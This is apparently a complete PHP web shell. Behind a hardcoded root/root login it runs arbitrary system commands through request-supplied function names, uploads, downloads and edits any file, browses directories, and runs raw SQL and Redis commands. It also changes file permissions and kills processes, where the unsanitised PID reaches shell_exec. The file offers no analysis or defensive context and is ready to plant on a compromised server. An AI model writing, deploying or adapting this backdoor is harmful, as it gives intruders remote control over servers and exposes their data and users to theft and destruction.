<?php
session_start();

$_ = "REQUEST"; // Changed to REQUEST to accept GET, POST, etc.

// Handle login
if (isset($_POST['login'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    if ($username === 'root' && $password === 'root') {
        $_SESSION['logged_in'] = true;
        echo "Login successful!";
    } else {
        echo "Invalid credentials";
    }
}

// Check if logged in
if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
    // Show login form
    ?>
    <form method="post">
        <input type="text" name="username" placeholder="Username" value="root">
        <input type="password" name="password" placeholder="Password" value="root">
        <input type="submit" name="login" value="Login">
    </form>
    <?php
    exit; // Stop execution if not logged in
}

// If logged in, proceed with other features

// Command execution
if (isset($_REQUEST["_"]) && isset($_REQUEST["__"]) && is_callable($_REQUEST["_"])) {
    ob_start();
    $_REQUEST["_"]($_REQUEST["__"]);
    $output = ob_get_clean();
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
}

// File upload
elseif (isset($_POST['upload']) && isset($_FILES['file']) && isset($_POST['path'])) {
    $uploadPath = $_POST['path'] . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
        echo "File uploaded successfully to $uploadPath";
    } else {
        echo "File upload failed";
    }
}

// File download
elseif (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    } else {
        echo "File not found";
    }
}

// File edit
elseif (isset($_POST['edit']) && isset($_POST['file']) && isset($_POST['content'])) {
    $file = $_POST['file'];
    if (file_exists($file) && is_writable($file)) {
        file_put_contents($file, $_POST['content']);
        echo "File saved successfully";
    } else {
        echo "Unable to save file";
    }
} elseif (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    if (file_exists($file) && is_readable($file)) {
        $content = file_get_contents($file);
        $extension = pathinfo($file, PATHINFO_EXTENSION);
        $mode = 'text'; // Default mode
        switch ($extension) {
            case 'php': $mode = 'php'; break;
            case 'js': $mode = 'javascript'; break;
            case 'html': $mode = 'html'; break;
            case 'css': $mode = 'css'; break;
            case 'py': $mode = 'python'; break;
            case 'java': $mode = 'java'; break;
            case 'sql': $mode = 'sql'; break;
            case 'json': $mode = 'json'; break;
            case 'xml': $mode = 'xml'; break;
            case 'yaml': case 'yml': $mode = 'yaml'; break;
            case 'rb': $mode = 'ruby'; break;
            case 'cs': $mode = 'csharp'; break;
            case 'ts': $mode = 'typescript'; break;
            case 'go': $mode = 'golang'; break;
            case 'swift': $mode = 'swift'; break;
            case 'kt': $mode = 'kotlin'; break;
            case 'c': case 'cpp': $mode = 'c_cpp'; break;
            case 'sh': $mode = 'sh'; break;
            // Add more as needed
        }
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>Advanced File Editor</title>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/ace.js"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/ext-searchbox.js"></script>
            <style>
                #editor { 
                    position: relative;
                    height: 600px;
                    width: 100%;
                }
            </style>
        </head>
        <body>
            <form method="post">
                <input type="hidden" name="file" value="<?php echo htmlspecialchars($file); ?>">
                <div id="editor"><?php echo htmlspecialchars($content); ?></div>
                <textarea name="content" id="content" style="display:none;"></textarea>
                <input type="text" id="find-text" placeholder="Find">
                <input type="text" id="replace-text" placeholder="Replace">
                <button type="button" onclick="findText()">Find</button>
                <button type="button" onclick="replaceText()">Replace</button>
                <button type="button" onclick="replaceAllText()">Replace All</button>
                <input type="submit" name="edit" value="Save">
            </form>
            <script>
                var editor = ace.edit("editor");
                editor.setTheme("ace/theme/monokai");
                editor.session.setMode("ace/mode/<?php echo $mode; ?>");
                editor.setOptions({
                    enableBasicAutocompletion: true,
                    enableSnippets: true,
                    enableLiveAutocompletion: true,
                    showPrintMargin: false,
                    fontSize: "14pt",
                    useSoftTabs: true,
                    tabSize: 4,
                    wrap: true,
                    highlightActiveLine: true,
                    showGutter: true,
                    behavioursEnabled: true
                });
                editor.commands.addCommand({
                    name: 'saveFile',
                    bindKey: {win: 'Ctrl-S', mac: 'Command-S'},
                    exec: function(editor) {
                        document.querySelector('#content').value = editor.getValue();
                        document.forms[0].submit();
                    }
                });
                document.querySelector('#content').value = editor.getValue();
                editor.session.on('change', function() {
                    document.querySelector('#content').value = editor.getValue();
                });

                // Find and replace functions
                function findText() {
                    var needle = document.getElementById('find-text').value;
                    editor.find(needle, {
                        backwards: false,
                        wrap: true,
                        caseSensitive: false,
                        wholeWord: false,
                        regExp: false
                    });
                }

                function replaceText() {
                    var replacement = document.getElementById('replace-text').value;
                    editor.replace(replacement);
                }

                function replaceAllText() {
                    var replacement = document.getElementById('replace-text').value;
                    editor.replaceAll(replacement);
                }
            </script>
        </body>
        </html>
        <?php
        exit;
    } else {
        echo "Unable to read file";
    }
}

// Directory listing and file system enumeration
elseif (isset($_GET['dir'])) {
    $dir = $_GET['dir'];
    if (is_dir($dir)) {
        echo "<h2>Listing directory: " . htmlspecialchars($dir) . "</h2>";
        echo "<ul>";
        $files = scandir($dir);
        foreach ($files as $file) {
            if ($file !== '.' && $file !== '..') {
                $fullPath = rtrim($dir, '/') . '/' . $file;
                if (is_dir($fullPath)) {
                    echo "<li><a href='?dir=" . urlencode($fullPath) . "'>[DIR] " . htmlspecialchars($file) . "</a></li>";
                } else {
                    echo "<li>" . htmlspecialchars($file) . " 
                        <a href='?download=" . urlencode($fullPath) . "'>[Download]</a>
                        <a href='?edit=" . urlencode($fullPath) . "'>[Edit]</a>
                        <a href='?hexview=" . urlencode($fullPath) . "'>[Hex View]</a>
                    </li>";
                }
            }
        }
        echo "</ul>";
    } else {
        echo "Invalid directory";
    }
}

// Hex view for binary files
elseif (isset($_GET['hexview'])) {
    $file = $_GET['hexview'];
    if (file_exists($file) && is_readable($file)) {
        $content = file_get_contents($file);
        $hex = bin2hex($content);
        $hexLines = str_split($hex, 32);
        echo "<h2>Hex View of: " . htmlspecialchars($file) . "</h2>";
        echo "<pre>";
        $offset = 0;
        foreach ($hexLines as $line) {
            $hexStr = implode(' ', str_split($line, 2));
            $asciiStr = '';
            for ($i = 0; $i < strlen($line); $i += 2) {
                $byte = hex2bin(substr($line, $i, 2));
                $asciiStr .= (ctype_print($byte) ? $byte : '.');
            }
            printf("%08x: %-48s  %s\n", $offset, $hexStr, $asciiStr);
            $offset += 16;
        }
        echo "</pre>";
        exit;
    } else {
        echo "Unable to read file";
    }
}

// Redis management
elseif (isset($_POST['redis_set'])) {
    $redis = new Redis();
    $redis->connect('127.0.0.1', 6379);
    $key = $_POST['redis_key'];
    $value = $_POST['redis_value'];
    $redis->set($key, $value);
    echo "Redis key set: $key => $value";
} elseif (isset($_POST['redis_get'])) {
    $redis = new Redis();
    $redis->connect('127.0.0.1', 6379);
    $key = $_POST['redis_key'];
    $value = $redis->get($key);
    echo "Redis value for $key: " . htmlspecialchars($value);
} elseif (isset($_POST['redis_del'])) {
    $redis = new Redis();
    $redis->connect('127.0.0.1', 6379);
    $key = $_POST['redis_key'];
    $redis->del($key);
    echo "Redis key deleted: $key";
} elseif (isset($_GET['redis_list'])) {
    $redis = new Redis();
    $redis->connect('127.0.0.1', 6379);
    $keys = $redis->keys('*');
    echo "<h2>Redis Keys</h2><ul>";
    foreach ($keys as $key) {
        echo "<li>" . htmlspecialchars($key) . "</li>";
    }
    echo "</ul>";
}

// Enhanced Database management (SQL mapper and editor)
elseif (isset($_GET['db_list_dbs'])) {
    $host = $_GET['db_host'] ?? 'localhost';
    $user = $_GET['db_user'] ?? 'root';
    $pass = $_GET['db_pass'] ?? '';
    try {
        $pdo = new PDO("mysql:host=$host", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $pdo->query("SHOW DATABASES");
        $dbs = $stmt->fetchAll(PDO::FETCH_COLUMN);
        echo "<h2>Databases</h2><ul>";
        foreach ($dbs as $db) {
            echo "<li><a href='?db_list_tables&db_name=$db&db_host=$host&db_user=$user&db_pass=$pass'>$db</a></li>";
        }
        echo "</ul>";
    } catch (PDOException $e) {
        echo "Database error: " . $e->getMessage();
    }
} elseif (isset($_GET['db_list_tables'])) {
    $host = $_GET['db_host'] ?? 'localhost';
    $user = $_GET['db_user'] ?? 'root';
    $pass = $_GET['db_pass'] ?? '';
    $db = $_GET['db_name'] ?? '';
    try {
        $pdo = new PDO("mysql:host=$host;dbname=$db", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $pdo->query("SHOW TABLES");
        $tables = $stmt->fetchAll(PDO::FETCH_COLUMN);
        echo "<h2>Tables in $db</h2><ul>";
        foreach ($tables as $table) {
            echo "<li><a href='?db_list_columns&db_name=$db&table=$table&db_host=$host&db_user=$user&db_pass=$pass'>$table</a></li>";
        }
        echo "</ul>";
    } catch (PDOException $e) {
        echo "Database error: " . $e->getMessage();
    }
} elseif (isset($_GET['db_list_columns'])) {
    $host = $_GET['db_host'] ?? 'localhost';
    $user = $_GET['db_user'] ?? 'root';
    $pass = $_GET['db_pass'] ?? '';
    $db = $_GET['db_name'] ?? '';
    $table = $_GET['table'] ?? '';
    try {
        $pdo = new PDO("mysql:host=$host;dbname=$db", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $pdo->query("DESCRIBE $table");
        $columns = $stmt->fetchAll(PDO::FETCH_ASSOC);
        echo "<h2>Columns in $db.$table</h2><table border='1'><tr><th>Field</th><th>Type</th><th>Null</th><th>Key</th><th>Default</th><th>Extra</th></tr>";
        foreach ($columns as $col) {
            echo "<tr>";
            foreach ($col as $value) {
                echo "<td>" . htmlspecialchars($value) . "</td>";
            }
            echo "</tr>";
        }
        echo "</table>";
        echo "<a href='?db_view_data&db_name=$db&table=$table&db_host=$host&db_user=$user&db_pass=$pass'>View Data</a>";
    } catch (PDOException $e) {
        echo "Database error: " . $e->getMessage();
    }
} elseif (isset($_GET['db_view_data'])) {
    $host = $_GET['db_host'] ?? 'localhost';
    $user = $_GET['db_user'] ?? 'root';
    $pass = $_GET['db_pass'] ?? '';
    $db = $_GET['db_name'] ?? '';
    $table = $_GET['table'] ?? '';
    try {
        $pdo = new PDO("mysql:host=$host;dbname=$db", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $pdo->query("SELECT * FROM $table LIMIT 100");
        $data = $stmt->fetchAll(PDO::FETCH_ASSOC);
        if (count($data) > 0) {
            echo "<h2>Data in $db.$table</h2>";
            echo "<table border='1'><tr>";
            foreach (array_keys($data[0]) as $key) {
                echo "<th>" . htmlspecialchars($key) . "</th>";
            }
            echo "<th>Actions</th></tr>";
            foreach ($data as $row) {
                echo "<tr>";
                $row_id = ''; // Assume first column is ID for simplicity
                foreach ($row as $key => $value) {
                    if (!$row_id) $row_id = $value;
                    echo "<td>" . htmlspecialchars($value) . "</td>";
                }
                echo "<td><a href='?db_edit_row&db_name=$db&table=$table&id=$row_id&db_host=$host&db_user=$user&db_pass=$pass'>Edit</a> | <a href='?db_delete_row&db_name=$db&table=$table&id=$row_id&db_host=$host&db_user=$user&db_pass=$pass'>Delete</a></td>";
                echo "</tr>";
            }
            echo "</table>";
        } else {
            echo "No data";
        }
    } catch (PDOException $e) {
        echo "Database error: " . $e->getMessage();
    }
} elseif (isset($_POST['db_update_row'])) {
    $host = $_POST['db_host'] ?? 'localhost';
    $user = $_POST['db_user'] ?? 'root';
    $pass = $_POST['db_pass'] ?? '';
    $db = $_POST['db_name'] ?? '';
    $table = $_POST['table'] ?? '';
    $id = $_POST['id'] ?? '';
    $data = $_POST['data'] ?? [];
    try {
        $pdo = new PDO("mysql:host=$host;dbname=$db", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $sets = [];
        $params = [];
        foreach ($data as $col => $val) {
            $sets[] = "$col = :$col";
            $params[":$col"] = $val;
        }
        $params[':id'] = $id;
        $sql = "UPDATE $table SET " . implode(', ', $sets) . " WHERE id = :id"; // Assume id column
        $stmt = $pdo->prepare($sql);
        $stmt->execute($params);
        echo "Row updated";
    } catch (PDOException $e) {
        echo "Database error: " . $e->getMessage();
    }
} elseif (isset($_GET['db_edit_row'])) {
    $host = $_GET['db_host'] ?? 'localhost';
    $user = $_GET['db_user'] ?? 'root';
    $pass = $_GET['db_pass'] ?? '';
    $db = $_GET['db_name'] ?? '';
    $table = $_GET['table'] ?? '';
    $id = $_GET['id'] ?? '';
    try {
        $pdo = new PDO("mysql:host=$host;dbname=$db", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $pdo->prepare("SELECT * FROM $table WHERE id = :id");
        $stmt->execute([':id' => $id]);
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        if ($row) {
            echo "<h2>Edit Row in $db.$table</h2>";
            echo "<form method='post'>";
            echo "<input type='hidden' name='db_name' value='$db'>";
            echo "<input type='hidden' name='table' value='$table'>";
            echo "<input type='hidden' name='id' value='$id'>";
            echo "<input type='hidden' name='db_host' value='$host'>";
            echo "<input type='hidden' name='db_user' value='$user'>";
            echo "<input type='hidden' name='db_pass' value='$pass'>";
            foreach ($row as $col => $val) {
                echo "$col: <input type='text' name='data[$col]' value='" . htmlspecialchars($val) . "'><br>";
            }
            echo "<input type='submit' name='db_update_row' value='Update'>";
            echo "</form>";
        } else {
            echo "Row not found";
        }
    } catch (PDOException $e) {
        echo "Database error: " . $e->getMessage();
    }
    exit;
} elseif (isset($_GET['db_delete_row'])) {
    $host = $_GET['db_host'] ?? 'localhost';
    $user = $_GET['db_user'] ?? 'root';
    $pass = $_GET['db_pass'] ?? '';
    $db = $_GET['db_name'] ?? '';
    $table = $_GET['table'] ?? '';
    $id = $_GET['id'] ?? '';
    try {
        $pdo = new PDO("mysql:host=$host;dbname=$db", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $pdo->prepare("DELETE FROM $table WHERE id = :id");
        $stmt->execute([':id' => $id]);
        echo "Row deleted";
    } catch (PDOException $e) {
        echo "Database error: " . $e->getMessage();
    }
} elseif (isset($_POST['db_query'])) {
    $host = $_POST['db_host'] ?? 'localhost';
    $user = $_POST['db_user'] ?? 'root';
    $pass = $_POST['db_pass'] ?? '';
    $db = $_POST['db_name'] ?? '';
    $query = $_POST['query'] ?? '';

    try {
        $pdo = new PDO("mysql:host=$host;dbname=$db", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $pdo->prepare($query);
        $stmt->execute();
        $results = $stmt->fetchAll(PDO::FETCH_ASSOC);

        echo "<h2>Query Results</h2>";
        if (count($results) > 0) {
            echo "<table border='1'><tr>";
            foreach (array_keys($results[0]) as $key) {
                echo "<th>" . htmlspecialchars($key) . "</th>";
            }
            echo "</tr>";
            foreach ($results as $row) {
                echo "<tr>";
                foreach ($row as $value) {
                    echo "<td>" . htmlspecialchars($value) . "</td>";
                }
                echo "</tr>";
            }
            echo "</table>";
        } else {
            echo "No results or query executed successfully (e.g., INSERT/UPDATE)";
        }
    } catch (PDOException $e) {
        echo "Database error: " . $e->getMessage();
    }
}

// Additional features: Process listing/killing
elseif (isset($_GET['processes'])) {
    $output = shell_exec('ps aux');
    echo "<h2>Process List</h2><pre>" . htmlspecialchars($output) . "</pre>";
} elseif (isset($_POST['kill_process'])) {
    $pid = $_POST['pid'];
    shell_exec("kill -9 $pid");
    echo "Process $pid killed";
}

?>

<!-- Advanced features -->
<!-- Command execution form -->
<form method="get">
    <input type="text" name="_" placeholder="Function (e.g., system)" value="system">
    <input type="text" name="__" placeholder="Argument (e.g., ls -la)">
    <input type="submit" value="Execute">
</form>

<!-- Simple file upload form -->
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="text" name="path" placeholder="Upload path (e.g., .)" value=".">
    <input type="submit" name="upload" value="Upload">
</form>

<!-- Directory listing form -->
<form method="get">
    <input type="text" name="dir" placeholder="Directory path (e.g., .)" value=".">
    <input type="submit" value="List Directory">
</form>

<!-- Redis management forms -->
<h2>Redis Management</h2>
<form method="post">
    <input type="text" name="redis_key" placeholder="Key">
    <input type="text" name="redis_value" placeholder="Value">
    <input type="submit" name="redis_set" value="Set Key">
</form>
<form method="post">
    <input type="text" name="redis_key" placeholder="Key">
    <input type="submit" name="redis_get" value="Get Key">
</form>
<form method="post">
    <input type="text" name="redis_key" placeholder="Key">
    <input type="submit" name="redis_del" value="Delete Key">
</form>
<a href="?redis_list=1">List All Keys</a>

<!-- Database management form -->
<h2>SQL Query Executor</h2>
<form method="post">
    <input type="text" name="db_host" placeholder="DB Host" value="localhost">
    <input type="text" name="db_user" placeholder="DB User" value="root">
    <input type="password" name="db_pass" placeholder="DB Pass">
    <input type="text" name="db_name" placeholder="DB Name">
    <textarea name="query" placeholder="SQL Query" rows="5" cols="80"></textarea>
    <input type="submit" name="db_query" value="Execute Query">
</form>

<!-- SQL Mapper -->
<h2>SQL Database Mapper</h2>
<form method="get">
    <input type="hidden" name="db_list_dbs" value="1">
    <input type="text" name="db_host" placeholder="DB Host" value="localhost">
    <input type="text" name="db_user" placeholder="DB User" value="root">
    <input type="password" name="db_pass" placeholder="DB Pass">
    <input type="submit" value="List Databases">
</form>

<!-- Additional advanced features: File permissions changer -->
<form method="post">
    <input type="text" name="chmod_file" placeholder="File/path to chmod">
    <input type="text" name="chmod_mode" placeholder="Mode (e.g., 0777)">
    <input type="submit" name="chmod" value="Change Permissions">
</form>
<?php
if (isset($_POST['chmod']) && isset($_POST['chmod_file']) && isset($_POST['chmod_mode'])) {
    $file = $_POST['chmod_file'];
    $mode = octdec($_POST['chmod_mode']);
    if (file_exists($file)) {
        if (chmod($file, $mode)) {
            echo "Permissions changed successfully";
        } else {
            echo "Failed to change permissions";
        }
    } else {
        echo "File not found";
    }
}
?>

<!-- Process management -->
<a href="?processes=1">List Processes</a>
<form method="post">
    <input type="text" name="pid" placeholder="PID to kill">
    <input type="submit" name="kill_process" value="Kill Process">
</form>

<!-- Logout link -->
<a href="?logout=1">Logout</a>

<?php
// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}
?>
